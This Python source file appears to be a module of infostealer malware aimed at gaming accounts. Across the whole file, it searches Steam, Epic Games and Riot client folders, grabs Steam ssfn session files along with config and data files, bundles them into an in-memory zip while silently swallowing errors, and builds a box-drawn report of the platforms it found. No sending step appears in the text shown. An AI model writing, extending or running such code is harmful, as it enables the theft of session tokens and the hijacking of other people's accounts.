import os
import shutil
import zipfile
import io

def get_gaming_paths():
    user_profile = os.environ['USERPROFILE']
    local_appdata = os.environ['LOCALAPPDATA']
    roaming_appdata = os.environ['APPDATA']
    
    return {
        "Steam": [
            os.path.join("C:\\", "Program Files (x86)", "Steam", "config"),
            os.path.join(user_profile, "Desktop", "Steam")
        ],
        "Epic": [
            os.path.join(local_appdata, "EpicGamesLauncher", "Saved", "Config", "Windows")
        ],
        "Riot": [
            os.path.join(local_appdata, "Riot Games", "Riot Client", "Data")
        ]
    }

def grab_gaming_sessions():
    paths = get_gaming_paths()
    session_files = []
    
    steam_root = os.path.join("C:\\", "Program Files (x86)", "Steam")
    if os.path.exists(steam_root):
        for file in os.listdir(steam_root):
            if file.startswith("ssfn"):
                session_files.append(("Steam/Sessions/" + file, os.path.join(steam_root, file)))

    for name, locations in paths.items():
        for loc in locations:
            if os.path.exists(loc):
                for root, dirs, files in os.walk(loc):
                    for file in files:
                        if any(ext in file.lower() for ext in ['.vdf', '.json', '.ini', '.dat', '.yaml']):
                            file_path = os.path.join(root, file)
                            try:
                                if os.path.getsize(file_path) < 2 * 1024 * 1024:
                                    arcname = os.path.join(name, os.path.relpath(file_path, loc))
                                    session_files.append((arcname, file_path))
                            except: pass
                    if root.count(os.sep) - loc.count(os.sep) > 1:
                        break
                        
    if not session_files:
        return None
        
    try:
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for arcname, full_path in session_files:
                try:
                    zipf.write(full_path, arcname=arcname)
                except: pass
        zip_buffer.seek(0)
        return zip_buffer.getvalue()
    except:
        return None

def get_gaming_report():
    paths = get_gaming_paths()
    found = []
    for name, locations in paths.items():
        if any(os.path.exists(l) for l in locations):
            found.append(name)
    
    if not found: return "No gaming clients found."
    
    report = "╔════════════════════════════════════════╗\n"
    report += "║            GAMING PLATFORMS            ║\n"
    report += "╠════════════════════════════════════════╣\n"
    for client in found:
        report += f"║ FOUND: {client.ljust(31)} ║\n"
    report += "╚════════════════════════════════════════╝"
    return report
